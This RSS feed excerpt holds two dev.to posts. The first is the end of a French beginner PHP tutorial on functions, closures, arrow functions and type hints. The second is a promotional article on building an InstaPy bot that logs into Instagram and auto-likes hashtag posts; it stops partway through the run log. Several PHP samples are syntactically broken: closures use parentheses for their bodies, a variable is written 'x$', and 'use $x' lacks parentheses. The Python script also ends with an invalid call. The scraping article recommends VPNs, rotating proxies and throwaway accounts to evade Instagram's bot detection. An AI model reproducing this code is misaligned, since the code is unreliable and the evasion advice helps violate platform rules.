&lt;p&gt;À noter que les paramètres avec une valeur par défaut doivent absolument être définit en dernier ordre.&lt;/p&gt;

&lt;p&gt;Depuis la version 8 de PHP il est possible de lancer une fonction en nommant les paramètres. L’appel est plus clair et l’ordre des paramètres n’a pas à être respecté.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lastName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;firstName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#linstruction-return"&gt;
  &lt;/a&gt;
  L’instruction Return
&lt;/h3&gt;

&lt;p&gt;Permet de retourner une valeur lorsque l’on l'appel la fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Doe'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici la fonction retourne une string concaténé avec prénom et nom&lt;/p&gt;

&lt;p&gt;La fonction echo va afficher sur la page web la valeur retournée par la fonction fullName()&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#fonctions-anonymes-closure"&gt;
  &lt;/a&gt;
  Fonctions anonymes (closure)
&lt;/h3&gt;

&lt;p&gt;Permet la création de fonctions sans préciser leur nom. Voici un exemple :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Les fonctions anonymes se terminent par un semi colon ;  Et elles ne peuvent pas accéder aux variables du contexte parent.&lt;/p&gt;

&lt;p&gt;Il est possible de passer une variable depuis le contexte parent avec l’instruction &lt;strong&gt;use&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="kt"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 35&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#callback-functions"&gt;
  &lt;/a&gt;
  Callback functions
&lt;/h3&gt;

&lt;p&gt;Les fonctions Callback sont des fonctions anonymes passé comme paramètre. Voici un exemple&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Array ( [0] =&amp;gt; iPhone 12 [1] =&amp;gt; iPhone 13 )&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici la fonction array_filter() possède une fonction anonyme comme deuxième paramètre. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#arrow-functions"&gt;
  &lt;/a&gt;
  Arrow functions
&lt;/h3&gt;

&lt;p&gt;Permet l’utilisation d’une syntaxe raccourci:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;À noter que pour le moment, les Arrow fonctions permettent l’exécution de seulement une expression. Les Arrow function sont exécuté dans le contexte en cours donc peuvent utiliser les variables sans à avoir à utiliser l’instruction &lt;strong&gt;use&lt;/strong&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#fonction-type-hint"&gt;
  &lt;/a&gt;
  Fonction Type Hint
&lt;/h3&gt;

&lt;p&gt;À noter que les fonctions peuvent être typé (string, int, etc.). Il est possible de définir un type pour chacun des paramètres et un type pour la valeur de retour de la fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici les paramètres $first et $last devront être de type string ainsi que le valeur de retour.&lt;/p&gt;

&lt;p&gt;Il existe plusieurs autres trucs à savoir sur les fonctions typé, nous y reviendrons un peu plus tard.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#strict-type"&gt;
  &lt;/a&gt;
  Strict Type
&lt;/h3&gt;

&lt;p&gt;Voici un exemple d’une fonction avec type&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 30&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Dans cette exemple le paramètre $a est de type integer. Malgré tout PHP ne retourne pas d’erreur. La raison c’est que PHP va tenter de convertir la string ‘10’ en integer. Si la conversion est possible alors aucune erreur n’est rapporté.&lt;/p&gt;

&lt;p&gt;Il arrive parfois que vous aimeriez que PHP ne permette pas cette conversion et exécute seulement si le paramètre est vraiment du type spécifié. Pour ce faire il faut ajouter un instruction au début de votre fichier.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;declare&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strict_types&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// TypeError&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici une erreur est retournée car le type du paramètre n’est pas un integer&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;C'est tout pour aujourd'hui, je publierai un nouvel article tous les deux jours environ. Pour être sûr de ne rien rater vous pouvez me suivre sur twitter : &lt;a href="https://twitter.com/EricLeCodeur"&gt;Suivre @EricLeCodeur&lt;/a&gt;&lt;/p&gt;

</description>
      <category>php</category>
      <category>tutoriel</category>
      <category>beginners</category>
    </item>
    <item>
      <title>How to create an Instagram Scraping Bot with Python</title>
      <author>SocialScrape</author>
      <pubDate>Sun, 23 Jan 2022 17:56:56 +0000</pubDate>
      <link>https://dev.to/socialscrape/how-to-create-an-instagram-scraping-bot-with-python-45c8</link>
      <guid>https://dev.to/socialscrape/how-to-create-an-instagram-scraping-bot-with-python-45c8</guid>
      <description>&lt;p&gt;&lt;strong&gt;THIS ARTICLE WAS ORIGINALLY POSTED ON THE SOCIALSCRAPE &lt;a href="https://www.socialscrape.com/post/create-instagram-scraping-bot-python"&gt;BLOG&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to scrape Instagram 📷&lt;/strong&gt;&lt;br&gt;
Instagram is one of the world's largest social media platforms, developed for users to share moments, market new products, and ultimately create their aesthetic reality. With almost 900 million user profiles, it also happens to be a great place to scrape data, and find new trends in any category you can think of! 🌎&lt;/p&gt;

&lt;p&gt;In this article, you are going to understand how to create an Instagram scraping bot in Python using instaPy. You'll also learn how you can scrape Instagram hassle-free with SocialScrape. SocialScrape is an inexpensive content scraping API, with a super friendly UI, that allows you to scrape Instagram in just one step! You even get your first 100 calls free! 📞 😍&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation &amp;amp; Requirements&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Have Python2.7 or Python3 installed on your local machine ✅&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pip or pip3 installed on your local machine ✅&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Have Firefox browser installed on your local machine ✅&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Some knowledge of Python/Data manipulation ✅&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Why scrape Instagram? 📈&lt;/strong&gt;&lt;br&gt;
Unfortunately, Instagram is one platform that can be difficult to scrape. For starters, it's not guaranteed that an account will hold an abundance of data, and even the ones that are full of data don't have much to choose from. Instagram also uses powerful tools to prevent bottling and catches on easily to "over-active" profiles. But, that's not to say it isn't impossible to do! So, the question remains why would you want to scrape Instagram?&lt;/p&gt;

&lt;p&gt;By scraping user profiles developers can find endless data trends. Due to its ever-increasing user profile count, Instagram estimates to be home to over a billion posts. And with that much digital media, captions, hashtags, etc. developers and data scientists can learn an immense amount about a population, regardless, data-abundant or not.&lt;/p&gt;

&lt;p&gt;Are you, or possibly someone you're writing this script for, an IG influencer? Or, perhaps you're interested in growing a follower count and need to understand the basics of "How to be an influencer". By creating a script that looks for users with 10,000+ followers using the hashtag #beauty, you could find what trends exist amongst other IG beauty influencers through media/captions. Not to mention, find out what the #beauty audience responds most positively to by examining the like count on each media. Once you have all this information, you can even begin thinking about creating bots that execute interactions with real-time users utilizing the obtained data. The opportunities are truly infinite.&lt;/p&gt;

&lt;p&gt;Now that you have some ideas about what you want to do with your data, let's start scraping!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to create an Instagram Scraping Bot&lt;/strong&gt;✨ &lt;br&gt;
This bot will be created using Python, if you are searching to scrape Instagram in other languages such as Node, Ruby, PHP, or Shell. Try heading over to SocialScrape! ✨&lt;/p&gt;

&lt;p&gt;For this example, you'll be creating a script that finds the most up-to-date data trends for the #beauty and #fashion hashtags/audience. Feel free to code along yourself, or follow along with this &lt;a href="https://github.com/socialscrape/scraping_py"&gt;github&lt;/a&gt; repository.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Open up your favorite code editor and navigate to a directory you'd like to create your scraping bot in, or create a new ig_scraping directory. Next inside your ig_scraping directory, create a ig_scraping_bot.py file, this is where you'll write your script.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To create this script, you'll first need to import instaPy into the file. You can install &lt;a href="https://pypi.org/project/instapy"&gt;instaPy&lt;/a&gt; by running:&lt;/p&gt;

&lt;p&gt;🚩 If you are using pip3, you may have to run pip3 install instapy instead.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pip install instapy&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Import instaPy library into the file.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Instantiate instaPy by passing in an account username and password. You can set the instance to a variable named session.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;🚩 It is not recommended to perform scraping on an important/personal account!&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Login to the designated scraping IG account using instaPy's login() method.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Use the set relationship_bounds method to determine the attributes a user must have to determine whether you would like to scrape, _in this case also like, it.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;If the user passes the set_relationship_bounds, the post will be liked and returned in the response.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Now that you have some response data from posts you've liked, you can observe the output of creating scripts based on the trend data you're looking for.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here is an example of what your scraping bot may look like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;from instapy import InstaPy

#Turn on VPN or use requests package to create (rotating) proxies

# PASS IN USERNAME, PASSWORD, and TWO HASHTAGS you would like to scrape from

def run_ig_scraping_session(username, password, hashtag1, hashtag2):
    # 1. session -&amp;gt;
    # create a session variable from the InstaPy initialization
    session = InstaPy(username=username, password=password)
    # 2. session.login -&amp;gt;
    #Login into IG with username and password given above.
    session.login()
    # 3. session.set_relationship_bounds -&amp;gt;
    # (from InstaPy Docs:)
    # THIS IS USED TO CHECK THE NUMBER OF
    # FOLLOWERS AND/OR FOLLOWING A USER HAS AND IF
    # THESE NUMBERS EITHER EXCEED THE NUMBER SET OR
    # DOES NOT PASS THE NUMBER SET OR IF THEIR RATIO
    # DOES NOT REACH DESIRED POTENCY RATIO THEN NO
    # FURTHER INTERACTION HAPPENS
        # Arguments
            # potency_ratio: following is higher than follower count
            # delimit_by_numbers: is used to activate &amp;amp; deactivate the usage of max &amp;amp; min values
            # max_followers: maximum of follower count user can have
            # max_following: maximum following count user can have
            # min_followers: minimum follower count user can have
            # min_following: minimum following count user can have
            # min_posts: minimum amount of posts user can have
            # max_posts: maximum amount of posts user can have
    session.set_relationship_bounds(enabled=True,
                    potency_ratio=1.34,
                    delimit_by_numbers=True,
                    max_followers=20000,
                    max_following=4000,
                        min_followers=4000,
                        min_following=800,
                        min_posts=20,
                max_posts=1000)
    # 4. session.like_by_tags -&amp;gt;
    # Establish a liked_photos variable that will return the information liked pictures data
    # created by the session.like_by_tags method, this method will only execute if the post falls
    # within the set_relationship_bounds set above
        # Arguments:
        # amount: Amount of photos set to like for each hashtag passed
        # daysold: How many days old the post is allowed to be
        # max_pic: The maximum amount back the picture is allowed to be found on the users profile (i.e. The 20th most recent pic)
    liked_photos = session.like_by_tags([hashtag1, hashtag2], amount=10)
    # 5. Return liked photos that the method above finds based on the arguments passed
    return "CONTENT: ", liked_photos

    # 6. Now that you have the returned data, you can see what trends are found in the media post
    # (such as trends found in captions, content type, etc.)

run_ig_scraping_session(, , "Fashion", "Beauty")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once you've run your script, your response should look something like this, keep in mind the responses can get lengthy, so make sure to take advantage of the amount argument passed in above :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;InstaPy Version: 0.6.15
 ._.  ._.  ._.  ._.  ._.  ._.  ._.  ._.  ._.
Workspace in use: "/Users/user1/InstaPy"
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
INFO [2022-01-17 15:46:47] [&amp;lt;Your Username&amp;gt;]  Session started!
oooooooooooooooooooooooooooooooooooooooooooooooooooooo
INFO [2022-01-17 15:46:47] [&amp;lt;Your Username&amp;gt;]  -- Connection Checklist [1/2] (Internet Connection Status)
INFO [2022-01-17 15:46:48] [&amp;lt;Your Username&amp;gt;]  - Internet Connection Status: ok
INFO [2022-01-17 15:46:48] [&amp;lt;Your Username&amp;gt;]  - Current IP is "71.127.218.114" and it's from "United States/US"
INFO [2022-01-17 15:46:48] [&amp;lt;Your Username&amp;gt;]  -- Connection Checklist [2/2] (Hide Selenium Extension)
INFO [2022-01-17 15:46:48] [&amp;lt;Your Username&amp;gt;]  - window.navigator.webdriver response: True
WARNING [2022-01-17 15:46:48] [&amp;lt;Your Username&amp;gt;]  - Hide Selenium Extension: error
INFO [2022-01-17 15:46:55] [&amp;lt;Your Username&amp;gt;]  - Cookie file for user '&amp;lt;Your Username&amp;gt;' loaded...
................................................................
INFO [2022-01-17 15:47:21] [&amp;lt;Your Username&amp;gt;]  Logged in successfully!
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
INFO [2022-01-17 15:47:21] [&amp;lt;Your Username&amp;gt;]  Saving account progress...
INFO [2022-01-17 15:47:25] [&amp;lt;Your Username&amp;gt;]  Tag [1/2]
INFO [2022-01-17 15:47:25] [&amp;lt;Your Username&amp;gt;]  --&amp;gt; b'fashion'
/Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages/selenium/webdriver/remote/webelement.py:359: UserWarning: find_elements_by_* commands are deprecated. Please use find_elements() instead
  warnings.warn("find_elements_by_* commands are deprecated. Please use find_elements() instead")
INFO [2022-01-17 15:47:36] [&amp;lt;Your Username&amp;gt;]  desired amount: 11  |  top posts [disabled]: 9  |  possible posts: 1043222855
/Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages/selenium/webdriver/remote/webelement.py:426: UserWarning: find_elements_by_* commands are deprecated. Please use find_elements() instead
  warnings.warn("find_elements_by_* commands are deprecated. Please use find_elements() instead")
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
/Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages/selenium/webdriver/remote/webelement.py:393: UserWarning: find_element_by_* commands are deprecated. Please use find_element() instead
  warnings.warn("find_element_by_* commands are deprecated. Please use find_element() instead")
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Post category: Carousel
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Post category: Carousel
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Post category: Carousel
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
